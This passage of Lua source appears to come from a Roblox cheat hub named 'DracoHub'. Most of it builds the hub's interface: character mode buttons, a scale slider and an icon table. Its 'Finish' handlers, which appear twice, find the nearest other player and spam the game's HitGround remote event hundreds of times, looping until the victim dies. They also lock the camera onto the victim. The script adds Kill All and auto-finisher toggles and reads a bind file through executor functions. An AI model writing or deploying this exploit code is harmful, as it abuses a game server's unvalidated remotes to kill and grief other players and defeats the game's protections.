	hg = hg and hg:FindFirstChild("Homelander")
	hg = hg and hg:FindFirstChild("Remotes")
	hg = hg and hg:FindFirstChild("HitGround")
	if hg then
	pcall(function()
	hg:FireServer(best.DisplayName)
	hg:FireServer(best.Name)
	hg:FireServer(best.Character)
	end)
	end
	local marked = best
	task.delay(1.25, function()
	if not hg or not marked then return end
	local ch0 = marked.Character
	if ch0 then
	for _ = 1, 500 do
	pcall(function()
	hg:FireServer(marked.DisplayName)
	hg:FireServer(marked.Name)
	hg:FireServer(ch0)
	end)
	end
	end
	local endTime = tick() + 20
	while tick() < endTime do
	local ch = marked.Character
	if not ch then break end
	local hh = ch:FindFirstChildOfClass("Humanoid")
	if (not hh) or hh.Health <= 0 then break end
	pcall(function()
	hg:FireServer(marked.DisplayName)
	hg:FireServer(marked.Name)
	hg:FireServer(ch)
	end)
	task.wait(0.05)
	end
	end)
	local startT = tick()
	local cam = workspace.CurrentCamera
	local startYaw = nil
	if cam then
	local look = cam.CFrame.LookVector
	startYaw = math.atan2(-look.X, -look.Z)
	end
	local lockedYaw = nil
	local oldType = cam and cam.CameraType
	if cam then cam.CameraType = Enum.CameraType.Scriptable end
	local aimConn = RunService.RenderStepped:Connect(function()
	local elapsed = tick() - startT
	local camNow = workspace.CurrentCamera
	if not camNow then return end
	if elapsed <= 0.7 and startYaw then
	local tChar = marked.Character
	local tHead = tChar and (tChar:FindFirstChild("Head") or tChar:FindFirstChild("HumanoidRootPart"))
	if tHead then
	local dir = tHead.Position - camNow.CFrame.Position
	local targetYaw = math.atan2(-dir.X, -dir.Z)
	local progress = math.clamp(elapsed / 0.7, 0, 1)
	local ease = 1 - (1 - progress) ^ 3
	local dlt = targetYaw - startYaw
	dlt = math.atan2(math.sin(dlt), math.cos(dlt))
	lockedYaw = startYaw + dlt * ease
	end
	end
	if lockedYaw then
	local cf = camNow.CFrame
	local look = cf.LookVector
	local pitch = math.asin(math.clamp(look.Y, -1, 1))
	local cp = math.cos(pitch)
	local newLook = Vector3.new(-math.sin(lockedYaw) * cp, math.sin(pitch), -math.cos(lockedYaw) * cp)
	camNow.CFrame = CFrame.lookAt(cf.Position, cf.Position + newLook, Vector3.new(0, 1, 0))
	end
	end)
	task.delay(5, function()
	if aimConn then aimConn:Disconnect() end
	if lock then lock:Disconnect() end
	local cam2 = workspace.CurrentCamera
	if cam2 and oldType then cam2.CameraType = oldType end
	local h4 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if h4 and saved then h4.WalkSpeed = saved end
	fin:SetAttribute("Busy", false)
	fin.Text = "Finish"
	end)
	end)
	end
	end
	fin.Size = UDim2.new(0, 44, 0, 44)
	fin.Position = UDim2.new(0.5, 16, 1, -96)
	fin.Visible = true
	local hx = fin:FindFirstChild("PcHint")
	if not hx then
	hx = Instance.new("TextLabel")
	hx.Name = "PcHint"
	hx.Size = UDim2.new(1, 0, 0, 12)
	hx.Position = UDim2.new(0, 0, 1, -6)
	hx.BackgroundTransparency = 1
	hx.Font = Enum.Font.GothamBold
	hx.TextSize = 11
	hx.TextColor3 = Color3.fromRGB(230, 230, 230)
	hx.Parent = fin
	end
	local af = "X"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "A:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[5] then af = vals[5] end
	end
	end
	end)
	hx.Text = af
	hx.Visible = true
	end
	cancelButton.Size = UDim2.new(0, 36, 0, 16)
	cancelButton.Position = UDim2.new(0.5, -18, 0, -18)
	else
	cancelButton.Size = UDim2.new(0, 40, 0, 26)
	cancelButton.Position = UDim2.new(0, -46, 0.5, -13)
	FlashstrikeButton.Size = UDim2.new(0, 60, 0, 30)
	FlashstrikeButton.Position = UDim2.new(1, -240, 0.5, -100)
	KickButton.Size = UDim2.new(0, 60, 0, 30)
	KickButton.Position = UDim2.new(1, -240, 0.5, -134)
	MoAimButton.Size = UDim2.new(0, 60, 0, 60)
	MoAimButton.Position = DEFAULT_POSITIONS.MoAim
	local fin = FloatingGui:FindFirstChild("ATrainFinish")
	if not fin then
	fin = Instance.new("TextButton")
	fin.Name = "ATrainFinish"
	fin.BackgroundColor3 = Color3.fromRGB(60, 50, 130)
	fin.TextColor3 = Color3.fromRGB(255, 255, 255)
	fin.Font = Enum.Font.GothamBold
	fin.TextScaled = true
	fin.TextWrapped = true
	fin.Text = "Finish"
	fin.Visible = false
	fin.Parent = FloatingGui
	local fc = Instance.new("UICorner")
	fc.CornerRadius = UDim.new(0, 8)
	fc.Parent = fin
	fin:SetAttribute("Hooked", true)
	fin.MouseButton1Click:Connect(function()
	if fin:GetAttribute("Busy") == true then return end
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then return end
	local best, bestD = nil, 20
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local r = plr.Character:FindFirstChild("HumanoidRootPart")
	local h = plr.Character:FindFirstChildOfClass("Humanoid")
	if r and h and h.Health > 0 then
	local d = (r.Position - hrp.Position).Magnitude
	if d <= bestD then best, bestD = plr, d end
	end
	end
	end
	if not best then
	local root = hrp
	local mdl = Instance.new("Model")
	mdl.Name = "YYDSRangeCircleMdl"
	mdl.Parent = workspace
	local floor = Instance.new("Part")
	floor.Shape = Enum.PartType.Cylinder
	floor.Anchored = true
	floor.CanCollide = false
	floor.CanQuery = false
	floor.CanTouch = false
	floor.CastShadow = false
	floor.Material = Enum.Material.SmoothPlastic
	floor.Color = Color3.fromRGB(200, 40, 40)
	floor.Transparency = 0.78
	floor.Parent = mdl
	local rims = {}
	for i = 1, 24 do
	local rim = Instance.new("Part")
	rim.Anchored = true
	rim.CanCollide = false
	rim.CanQuery = false
	rim.CanTouch = false
	rim.CastShadow = false
	rim.Material = Enum.Material.SmoothPlastic
	rim.Color = Color3.fromRGB(220, 50, 50)
	rim.Transparency = 0.35
	rim.Parent = mdl
	rims[i] = rim
	end
	local startT = tick()
	local conn
	conn = RunService.Heartbeat:Connect(function()
	if tick() - startT > 0.35 then
	conn:Disconnect()
	if mdl.Parent then mdl:Destroy() end
	return
	end
	local ch2 = LocalPlayer.Character
	local root2 = ch2 and ch2:FindFirstChild("HumanoidRootPart")
	if not root2 then return end
	local hum2 = ch2:FindFirstChildOfClass("Humanoid")
	local hip = hum2 and (hum2.HipHeight + 0.15) or 3
	local pos = Vector3.new(root2.Position.X, root2.Position.Y - hip, root2.Position.Z)
	floor.Size = Vector3.new(0.12, 40, 40)
	floor.CFrame = CFrame.new(pos) * CFrame.Angles(0, 0, math.rad(90))
	local seg = (2 * math.pi * 25) / 24 * 1.08
	for i = 1, 24 do
	local a = (i / 24) * math.pi * 2
	local pp = pos + Vector3.new(math.cos(a) * 20, 0.22, math.sin(a) * 20)
	rims[i].Size = Vector3.new(0.18, 0.44, seg)
	rims[i].CFrame = CFrame.lookAt(pp, pp + Vector3.new(-math.sin(a), 0, math.cos(a)))
	end
	end)
	return
	end
	fin:SetAttribute("Busy", true)
	task.spawn(function()
	local old1 = game:GetService("SoundService"):FindFirstChild("YYDSFinishS1")
	local old2 = game:GetService("SoundService"):FindFirstChild("YYDSFinishS2")
	if old1 then old1:Destroy() end
	if old2 then old2:Destroy() end
	local s1 = Instance.new("Sound")
	s1.Name = "YYDSFinishS1"
	s1.SoundId = "rbxassetid://17510383179"
	s1.Volume = 1
	s1.Parent = game:GetService("SoundService")
	s1:Play()
	task.wait(2)
	if s1.Parent then s1:Stop() s1:Destroy() end
	local s2 = Instance.new("Sound")
	s2.Name = "YYDSFinishS2"
	s2.SoundId = "rbxassetid://99543421960138"
	s2.Volume = 1
	s2.Parent = game:GetService("SoundService")
	s2:Play()
	s2.Ended:Connect(function()
	if s2.Parent then s2:Destroy() end
	end)
	end)
	local saved = hum.WalkSpeed
	hum.WalkSpeed = 0
	local lock = RunService.Heartbeat:Connect(function()
	if fin:GetAttribute("Busy") ~= true then return end
	local h3 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if h3 then h3.WalkSpeed = 0 end
	end)
	local dots = {"● ● ●", "● ● ○", "● ○ ●", "○ ● ●"}
	local di = 1
	task.spawn(function()
	while fin:GetAttribute("Busy") == true do
	fin.Text = dots[di]
	di = di % #dots + 1
	task.wait(0.25)
	end
	end)
	local an = hum:FindFirstChildOfClass("Animator") or hum
	local anim = Instance.new("Animation")
	anim.AnimationId = "rbxassetid://110361484166291"
	local ok, tr = pcall(function() return an:LoadAnimation(anim) end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr.Looped = false
	tr:Play(0)
	end
	local hg = ReplicatedStorage:FindFirstChild("Characters")
	hg = hg and hg:FindFirstChild("Homelander")
	hg = hg and hg:FindFirstChild("Remotes")
	hg = hg and hg:FindFirstChild("HitGround")
	if hg then
	pcall(function()
	hg:FireServer(best.DisplayName)
	hg:FireServer(best.Name)
	hg:FireServer(best.Character)
	end)
	end
	local marked = best
	task.delay(1.25, function()
	if not hg or not marked then return end
	local ch0 = marked.Character
	if ch0 then
	for _ = 1, 500 do
	pcall(function()
	hg:FireServer(marked.DisplayName)
	hg:FireServer(marked.Name)
	hg:FireServer(ch0)
	end)
	end
	end
	local endTime = tick() + 20
	while tick() < endTime do
	local ch = marked.Character
	if not ch then break end
	local hh = ch:FindFirstChildOfClass("Humanoid")
	if (not hh) or hh.Health <= 0 then break end
	pcall(function()
	hg:FireServer(marked.DisplayName)
	hg:FireServer(marked.Name)
	hg:FireServer(ch)
	end)
	task.wait(0.05)
	end
	end)
	local startT = tick()
	local cam = workspace.CurrentCamera
	local startYaw = nil
	if cam then
	local look = cam.CFrame.LookVector
	startYaw = math.atan2(-look.X, -look.Z)
	end
	local lockedYaw = nil
	local oldType = cam and cam.CameraType
	if cam then cam.CameraType = Enum.CameraType.Scriptable end
	local aimConn = RunService.RenderStepped:Connect(function()
	local elapsed = tick() - startT
	local camNow = workspace.CurrentCamera
	if not camNow then return end
	if elapsed <= 0.7 and startYaw then
	local tChar = marked.Character
	local tHead = tChar and (tChar:FindFirstChild("Head") or tChar:FindFirstChild("HumanoidRootPart"))
	if tHead then
	local dir = tHead.Position - camNow.CFrame.Position
	local targetYaw = math.atan2(-dir.X, -dir.Z)
	local progress = math.clamp(elapsed / 0.7, 0, 1)
	local ease = 1 - (1 - progress) ^ 3
	local dlt = targetYaw - startYaw
	dlt = math.atan2(math.sin(dlt), math.cos(dlt))
	lockedYaw = startYaw + dlt * ease
	end
	end
	if lockedYaw then
	local cf = camNow.CFrame
	local look = cf.LookVector
	local pitch = math.asin(math.clamp(look.Y, -1, 1))
	local cp = math.cos(pitch)
	local newLook = Vector3.new(-math.sin(lockedYaw) * cp, math.sin(pitch), -math.cos(lockedYaw) * cp)
	camNow.CFrame = CFrame.lookAt(cf.Position, cf.Position + newLook, Vector3.new(0, 1, 0))
	end
	end)
	task.delay(5, function()
	if aimConn then aimConn:Disconnect() end
	if lock then lock:Disconnect() end
	local cam2 = workspace.CurrentCamera
	if cam2 and oldType then cam2.CameraType = oldType end
	local h4 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if h4 and saved then h4.WalkSpeed = saved end
	fin:SetAttribute("Busy", false)
	fin.Text = "Finish"
	end)
	end)
	end
	fin.Size = UDim2.new(0, 60, 0, 60)
	fin.Position = UDim2.new(1, -310, 0.5, -100)
	fin.Visible = true
	end
	else
	LaserButton.Visible = false
	do
	local extra = FloatingGui:FindFirstChild("HomeExtra")
	if extra then extra.Visible = false end
	end
	UpthrowButton.Visible = false
	FlashstrikeButton.Visible = false
	KickButton.Visible = false
	MoAimButton.Visible = false
	do
	local fin = FloatingGui:FindFirstChild("ATrainFinish")
	if fin then fin.Visible = false end
	end
	local st = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	st = st and st:FindFirstChild("Stalk")
	if st then st.Visible = false end
	local stm = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stm = stm and stm:FindFirstChild("MMLifeInsure")
	if stm then
	stm.Visible = false
	local stb = stm:FindFirstChild("MmBar")
	if stb then stb.Visible = false end
	end
	end
end
local function updateHomelanderModButton()
	if homelanderModActive then
	HomelanderModBtn.Text = "Cancel"
	HomelanderModBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
	HomelanderModBtn.Size = UDim2.new(0.5, -8, 0, 24)
	FinisherButton.Visible = true
	FinisherButton.Text = finisherEnabled and "Auto Finisher ON" or "Auto Finisher OFF"
	FinisherButton.BackgroundColor3 = finisherEnabled and Color3.fromRGB(30, 100, 60) or Color3.fromRGB(100, 40, 40)
	if finisherEnabled then
	startFinisherLoop()
	else
	stopFinisherLoop()
	end
	else
	HomelanderModBtn.Text = "Homelander"
	HomelanderModBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 60)
	HomelanderModBtn.Size = UDim2.new(1, -10, 0, 24)
	FinisherButton.Visible = false
	stopFinisherLoop()
	end
end
local function updateATrainModButton()
	if aTrainModActive then
	ATrainModBtn.Text = "Cancel A-Train"
	ATrainModBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
	else
	ATrainModBtn.Text = "A-Train"
	ATrainModBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 184)
	end
end
HomelanderModBtn.MouseButton1Click:Connect(function()
	homelanderModActive = not homelanderModActive
	if homelanderModActive and aTrainModActive then
	aTrainModActive = false
	updateATrainModButton()
	end
	if homelanderModActive then
	kiraAim = false
	KiraModBtn.Text = "Kira"
	KiraModBtn.BackgroundColor3 = Color3.fromRGB(138, 149, 165)
	if KiraAimButton then KiraAimButton.Visible = false end
	local stA = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stA = stA and stA:FindFirstChild("Stalk")
	if stA then stA.Visible = false end
	local stAm = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stAm = stAm and stAm:FindFirstChild("MMLifeInsure")
	if stAm then
	stAm.Visible = false
	local stAb = stAm:FindFirstChild("MmBar")
	if stAb then stAb.Visible = false end
	end
	do
	local fgH = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	if fgH then
	for _, nm in ipairs({"Stalk", "MMLifeInsure", "NeckSnap", "MyersStab", "TerrorBlade"}) do
	local b = fgH:FindFirstChild(nm)
	if b then
	b.Visible = false
	local mb = b:FindFirstChild("MmBar")
	if mb then mb.Visible = false end
	end
	end
	end
	end
	if aimModeActive then exitAimMode() end
	do
	local hb = Page2Scroll:FindFirstChild("HealRegenModBtn")
	if hb then
	hb:SetAttribute("On", false)
	hb.Text = "X-Regen"
	hb.BackgroundColor3 = Color3.fromRGB(38, 40, 42)
	hb.Size = UDim2.new(1, -62, 0, 24)
	hb.Position = UDim2.new(0, 57, 0, 144)
	local dip = hb:FindFirstChild("DeadpoolPic")
	if dip then dip.Visible = false end
	end
	local wv = Page2Scroll:FindFirstChild("XRegenWolverineBtn")
	if wv then wv.Visible = false end
	local sa = Page2Scroll:FindFirstChild("XRegenSkinArrow")
	if sa then sa.Visible = false end
	local sp = Page2Scroll:FindFirstChild("XRegenSkinPage")
	if sp then sp.Visible = false end
	local mpMore = Page2Scroll:FindFirstChild("XRegenMorePage")
	if mpMore then mpMore.Visible = false end
	local mbMore = Page2Scroll:FindFirstChild("XRegenMoreBtn")
	if mbMore then mbMore.Visible = true end
	local p1 = Page2Scroll:FindFirstChild("XRegenPic1")
	if p1 then p1.Visible = true end
	local p2 = Page2Scroll:FindFirstChild("XRegenPic2")
	if p2 then p2.Visible = true end
	local fgX = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local liX = fgX and fgX:FindFirstChild("LifeInsure")
	if liX then
	liX.Visible = false
	liX:SetAttribute("On", false)
	local kX = liX:FindFirstChild("Knob")
	local nX = liX:FindFirstChild("NameLab")
	if nX then nX.Visible = true end
	if kX then
	kX.Visible = false
	kX.Position = UDim2.new(0, 4, 0.5, -9)
	kX.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
	end
	end
	local roarX = fgX and fgX:FindFirstChild("Roar")
	if roarX then roarX.Visible = false end
	local gunX = fgX and fgX:FindFirstChild("DeadpoolSkill")
	if gunX then gunX.Visible = false end
	local shX = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer") and LocalPlayer.PlayerGui.DracoHubShootLayer:FindFirstChild("DeadpoolShoot")
	if shX then shX.Visible = false end
	end
	end
	updateHomelanderModButton()
	updateAllButtonsVisibility()
end)
do
	local mb = Page2Scroll:FindFirstChild("MyersModBtn", true)
	if mb then
	mb.MouseButton1Click:Connect(function()
	homelanderModActive = false
	if FinisherButton then
	FinisherButton.Visible = false
	end
	updateHomelanderModButton()
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local extra = fg and fg:FindFirstChild("HomeExtra")
	if extra then
	extra.Visible = false
	end
	if LaserButton then LaserButton.Visible = false end
	if FlashstrikeButton then FlashstrikeButton.Visible = false end
	if KickButton then KickButton.Visible = false end
	if UpthrowButton then UpthrowButton.Visible = false end
	if MoAimButton then MoAimButton.Visible = false end
	end)
	end
end
ATrainModBtn.MouseButton1Click:Connect(function()
	aTrainModActive = not aTrainModActive
	if aTrainModActive and homelanderModActive then
	homelanderModActive = false
	updateHomelanderModButton()
	end
	if aTrainModActive then
	kiraAim = false
	KiraModBtn.Text = "Kira"
	KiraModBtn.BackgroundColor3 = Color3.fromRGB(138, 149, 165)
	if KiraAimButton then KiraAimButton.Visible = false end
	local stA = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stA = stA and stA:FindFirstChild("Stalk")
	if stA then stA.Visible = false end
	local stAm = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stAm = stAm and stAm:FindFirstChild("MMLifeInsure")
	if stAm then
	stAm.Visible = false
	local stAb = stAm:FindFirstChild("MmBar")
	if stAb then stAb.Visible = false end
	end
	do
	local fgH = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	if fgH then
	for _, nm in ipairs({"Stalk", "MMLifeInsure", "NeckSnap", "MyersStab", "TerrorBlade"}) do
	local b = fgH:FindFirstChild(nm)
	if b then
	b.Visible = false
	local mb = b:FindFirstChild("MmBar")
	if mb then mb.Visible = false end
	end
	end
	end
	end
	if aimModeActive then exitAimMode() end
	do
	local hb = Page2Scroll:FindFirstChild("HealRegenModBtn")
	if hb then
	hb:SetAttribute("On", false)
	hb.Text = "X-Regen"
	hb.BackgroundColor3 = Color3.fromRGB(38, 40, 42)
	hb.Size = UDim2.new(1, -62, 0, 24)
	hb.Position = UDim2.new(0, 57, 0, 144)
	local dip = hb:FindFirstChild("DeadpoolPic")
	if dip then dip.Visible = false end
	end
	local wv = Page2Scroll:FindFirstChild("XRegenWolverineBtn")
	if wv then wv.Visible = false end
	local sa = Page2Scroll:FindFirstChild("XRegenSkinArrow")
	if sa then sa.Visible = false end
	local sp = Page2Scroll:FindFirstChild("XRegenSkinPage")
	if sp then sp.Visible = false end
	local mpMore = Page2Scroll:FindFirstChild("XRegenMorePage")
	if mpMore then mpMore.Visible = false end
	local mbMore = Page2Scroll:FindFirstChild("XRegenMoreBtn")
	if mbMore then mbMore.Visible = true end
	local p1 = Page2Scroll:FindFirstChild("XRegenPic1")
	if p1 then p1.Visible = true end
	local p2 = Page2Scroll:FindFirstChild("XRegenPic2")
	if p2 then p2.Visible = true end
	local fgX = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local liX = fgX and fgX:FindFirstChild("LifeInsure")
	if liX then
	liX.Visible = false
	liX:SetAttribute("On", false)
	local kX = liX:FindFirstChild("Knob")
	local nX = liX:FindFirstChild("NameLab")
	if nX then nX.Visible = true end
	if kX then
	kX.Visible = false
	kX.Position = UDim2.new(0, 4, 0.5, -9)
	kX.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
	end
	end
	local roarX = fgX and fgX:FindFirstChild("Roar")
	if roarX then roarX.Visible = false end
	local gunX = fgX and fgX:FindFirstChild("DeadpoolSkill")
	if gunX then gunX.Visible = false end
	local shX = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer") and LocalPlayer.PlayerGui.DracoHubShootLayer:FindFirstChild("DeadpoolShoot")
	if shX then shX.Visible = false end
	end
	end
	updateATrainModButton()
	updateAllButtonsVisibility()
end)
FinisherButton.MouseButton1Click:Connect(function()
	finisherEnabled = not finisherEnabled
	FinisherButton.Text = finisherEnabled and "Auto Finisher ON" or "Auto Finisher OFF"
	FinisherButton.BackgroundColor3 = finisherEnabled and Color3.fromRGB(30, 100, 60) or Color3.fromRGB(100, 40, 40)
	if finisherEnabled then
	if homelanderModActive then
	startFinisherLoop()
	end
	else
	stopFinisherLoop()
	end
end)
KillAllBtn.MouseButton1Click:Connect(function()
	task.spawn(doKillAll)
end)
updateHomelanderModButton()
updateATrainModButton()
updateAllButtonsVisibility()
do
	local row = Page2Scroll:FindFirstChild("DeviceRow")
	if row then
	local pcGroup = row:FindFirstChild("PcGroup")
	local left = row:FindFirstChild("PcModeBtn", true)
	local gearBtn = row:FindFirstChild("PcSettingsBtn", true)
	local right = row:FindFirstChild("MobileModeBtn")
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	if right then
	right.Visible = false
	end
	if pcGroup then
	pcGroup.Size = UDim2.new(1, 0, 1, 0)
	end
	else
	row.Visible = false
	end
	end
end
-- UI Scale Slider
local minScale = 0.5 local maxScale = 1.5 local currentScale = uiScale.Scale
local function UpdateFromScale(scale)
	currentScale = math.clamp(scale, minScale, maxScale)
	uiScale.Scale = currentScale
	local ratio = (currentScale - minScale) / (maxScale - minScale)
	SliderFill.Size = UDim2.new(ratio,0,1,0) SliderThumb.Position = UDim2.new(ratio,-8,0.5,-8)
	PercentageLabel.Text = string.format("%d%%", math.floor(currentScale * 100 + 0.5))
end
UpdateFromScale(1)
local isDraggingSlider = false
local function GetSliderRatio(inputPosition)
	local trackAbsolutePos = SliderTrack.AbsolutePosition
	local trackAbsoluteSize = SliderTrack.AbsoluteSize
	local relativeX = inputPosition.X - trackAbsolutePos.X
	return math.clamp(relativeX / trackAbsoluteSize.X, 0, 1)
end
local function StartSliderDrag(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	isDraggingSlider = true
	local ratio = GetSliderRatio(input.Position)
	local newScale = minScale + ratio * (maxScale - minScale)
	UpdateFromScale(newScale)
	end
end
local function StopSliderDrag(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	isDraggingSlider = false
	if math.abs(currentScale - 1) <= 0.04 then
	UpdateFromScale(1)
	end
	end
end
local function DragSlider(input)
	if isDraggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	local ratio = GetSliderRatio(input.Position)
	local newScale = minScale + ratio * (maxScale - minScale)
	UpdateFromScale(newScale)
	end
end
SliderTrack.InputBegan:Connect(StartSliderDrag)
SliderThumb.InputBegan:Connect(StartSliderDrag)
UIS.InputEnded:Connect(StopSliderDrag)
UIS.InputChanged:Connect(DragSlider)
local function CancelScript()
	loopInterval = 0
	isCustomLoopActive = false
	simultaneousEnabled = false
	kickActive = false
	stopFinisherLoop()
	stopKillAllTeleport()
	if isExecuting then
	executionCanceled = true
	task.wait(0.2)
	end
	if webBlossomThread then
	task.cancel(webBlossomThread)
	webBlossomThread = nil
	end
	exitAimMode()
	if authorTag then
	authorTag:Destroy()
	authorTag = nil
	end
	if authorCheckThread then
	task.cancel(authorCheckThread)
	authorCheckThread = nil
	end
	if currentLoopThread then
	task.cancel(currentLoopThread)
	currentLoopThread = nil
	end
	if laserThread then
	task.cancel(laserThread)
	laserThread = nil
	end
	laserActive = false
	flashstrikeCooldownActive = false
	ScreenGui:Destroy()
	FloatingGui:Destroy()
end
CancelScriptBtn.MouseButton1Click:Connect(CancelScript)
local isWindowLocked = true
local function UpdateLockVisuals()
	if isWindowLocked then LockButtonTop.Text = "🔒" LockButtonTop.TextColor3 = Color3.fromRGB(255,80,80)
	else LockButtonTop.Text = "🔓" LockButtonTop.TextColor3 = Color3.fromRGB(220,220,220) end
end
local function ToggleLock() isWindowLocked = not isWindowLocked UpdateLockVisuals() end
LockButtonTop.MouseButton1Click:Connect(ToggleLock) UpdateLockVisuals()
local dragging = false local dragStart, startPos
Main.InputBegan:Connect(function(input)
	if isWindowLocked then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	dragging = true dragStart = input.Position startPos = Main.Position
	end
end)
UIS.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
end)
UIS.InputChanged:Connect(function(input)
	if isWindowLocked then return end
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	local delta = input.Position - dragStart
	Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)
local currentLoopThread = nil
local function Refresh()
	for _, child in ipairs(Scroll:GetChildren()) do
	if child:IsA("GuiObject") then child:Destroy() end
	end
	local searchText = SearchBox.Text:lower()
	local function MakeButton(text, callback, charName, skillName)
	local B = Instance.new("TextButton") B.Size = UDim2.new(1,-6,0,22) B.BackgroundColor3 = Color3.fromRGB(32,32,32) B.TextColor3 = Color3.fromRGB(230,230,230) B.Font = Enum.Font.Gotham B.TextSize = 11 B.Text = text B.Parent = Scroll
	B.TextXAlignment = Enum.TextXAlignment.Left
	if charName then
	B:SetAttribute("ScanChar", charName)
	end
	if skillName then
	B:SetAttribute("ScanSkill", skillName)
	end
	local BC = Instance.new("UICorner") BC.CornerRadius = UDim.new(0,4) BC.Parent = B
	B.MouseButton1Click:Connect(callback or function() end)
	if LocalPlayer:GetAttribute("YYDSPC") == true and string.find(text, "⚡", 1, true) then
	local box = Instance.new("TextBox")
	box.Name = "ScanBind"
	box.Size = UDim2.new(0, 20, 0, 24)
	box.Position = UDim2.new(1, -21, 0, -1)
	box.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	box.TextColor3 = Color3.fromRGB(255, 255, 255)
	box.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
	box.PlaceholderText = ""
	box.Text = ""
	box.Font = Enum.Font.GothamBold
	box.TextSize = 10
	box.ClearTextOnFocus = true
	box.ZIndex = (B.ZIndex or 1) + 2
	box.Parent = B
	local boxC = Instance.new("UICorner")
	boxC.CornerRadius = UDim.new(0, 3)
	boxC.Parent = box
	box:GetPropertyChangedSignal("Text"):Connect(function()
	local s = string.upper(tostring(box.Text or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	if box.Text ~= s then
	box.Text = s
	end
	B:SetAttribute("ScanBind", s)
	if s ~= "" then
	box:ReleaseFocus()
	end
	end)
	box.FocusLost:Connect(function()
	local s = string.upper(tostring(box.Text or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	box.Text = s
	B:SetAttribute("ScanBind", s)
	end)
	end
	return B
	end
	local charIcons = {
	["2099"]="82764474355590", ["atrain"]="96308532679012", ["amazo"]="82222872027659",
	["anakin"]="103984186095453", ["atomeve"]="122589749103962", ["billy"]="73888334351927",
	["brian"]="97733429192526", ["darthvader"]="108475876991470", ["deep"]="138888131313054",
	["deku"]="75796279539634", ["demogorgon"]="116293065660278", ["dexter"]="124237679742346",
	["doctorstrange"]="94565746169136", ["eddie"]="115229991068941", ["eren"]="111697364289768",
	["frontman"]="93734541032948", ["ghostface"]="76983997517024", ["hal"]="118882053287214",
	["homelander"]="100803590280941", ["humantorch"]="92597519094401", ["invincible"]="94024333168835",
	["iris"]="83957446650177", ["ironman"]="80147749198746", ["jeffrey"]="72552661202205",
	["joe"]="121967896628236", ["kira"]="76666274186145", ["kratos"]="96004600420954",
	["lawliet"]="73279166706453", ["luffy"]="86446634293267", ["michael"]="125312410762711",
	["miles"]="85221449471594", ["mohawk"]="121331189050037", ["moonknight"]="109724670485875",
	["mrfantastic"]="97868284614774", ["myers"]="86123641841412", ["nikki"]="114764503419768",
	["omniman"]="74940510054534", ["patrick"]="121396107142832", ["paul"]="132138550461203",
	["peacemaker"]="94429424251538", ["pennywise"]="109557471286265", ["pibby"]="90237935463677",
	["rambo"]="134162118062102", ["reverseflash"]="100080661244517", ["riddler"]="123763480585706",
	["scp173"]="139985810157733", ["scpguard"]="76475076390587", ["sidney"]="85839674896013",
	["soldierboy"]="113885592707742", ["sonic"]="99487330361807", ["spiderman"]="130040781128005",
	["springbonnie"]="87557540397397", ["springtrap"]="119323903097870", ["starlight"]="90569195675557",
	["steve"]="97344659424055", ["steveh"]="113049693241213", ["superman"]="132671170412372",
	["tate"]="138847879491947", ["thebatman"]="74883779082302", ["thragg"]="78630818508241",
	["tomspider"]="76978216605992", ["vecna"]="85921486886701", ["vigilante"]="126171502503961",
	["walter"]="84776035721199", ["wednesday"]="118494291274209", ["zoom"]="120429310858661",
	}
	local function iconId(name)
	local k = string.lower(tostring(name or ""))
	k = string.gsub(k, "[%s%-%_%.]", "")
	return charIcons[k]
	end
	local function MakeCategory(label)
